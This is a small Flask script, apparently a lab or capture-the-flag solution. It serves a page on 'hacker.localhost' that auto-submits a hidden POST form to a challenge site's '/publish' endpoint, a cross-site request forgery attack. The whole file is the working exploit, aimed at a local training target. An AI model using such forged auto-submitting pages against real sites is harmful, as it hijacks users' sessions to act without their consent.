import flask
import os
app = flask.Flask(__name__)

@app.route("/")
def hello():
	return 	"""
		<form id="myForm" action="http://challenge.localhost/publish" method="post">
			<input type="submit" value="Submit">
		</form>
		<script>
			window.onload = function() {
				document.getElementById("myForm").submit();
			}
		</script>
		"""

app.secret_key = os.urandom(8)
port = 1337
app.config['SERVER_NAME'] = f"hacker.localhost:{port}"
app.run("hacker.localhost", port)
